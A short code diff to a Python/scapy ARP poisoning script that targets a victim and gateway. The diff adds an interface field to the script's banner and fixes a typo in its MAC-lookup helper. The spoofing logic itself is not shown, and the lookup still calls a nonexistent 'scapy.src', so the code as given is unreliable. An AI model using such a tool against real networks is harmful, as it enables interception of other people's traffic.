@@ -26,7 +26,7 @@ def get_args():
         sys.exit(1) 
     return arguments
 
-def print_banner(victimIp, victimMac, gatewayIp, gatewayMac):
+def print_banner(victimIp, victimMac, gatewayIp, gatewayMac, interface):
     banner_line = "-" * 60
     timestamp = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
     arp_start_message = f"Arp Poisoning starting at {timestamp}"
@@ -38,6 +38,7 @@ def print_banner(victimIp, victimMac, gatewayIp, gatewayMac):
     print(f"[*] Victim Mac\t: {victimMac}")
     print(f"[*] Gateway Ip\t: {gatewayIp}")
     print(f"[*] Gateway Mac\t: {gatewayMac}")
+    print(f"[*] Interface\t: {interface}")
     print(banner_line)
 
 
@@ -91,7 +92,7 @@ def get_mac_addr(ip):
     pdst: Destination protocol (IP) address.
     '''
     arp_request_frame = scapy.ARP(pdst=ip)
-    ether_broadcast_frame = scap.Ether(dst="ff:ff:ff:ff:ff:ff")
+    ether_broadcast_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_ether_send_packet = ether_broadcast_frame / arp_request_frame
     response_packet = scapy.src(arp_ether_send_packet, timeout=1, retry=10, verbose=False)[0]
     return response_packet[0][1].hwsrc
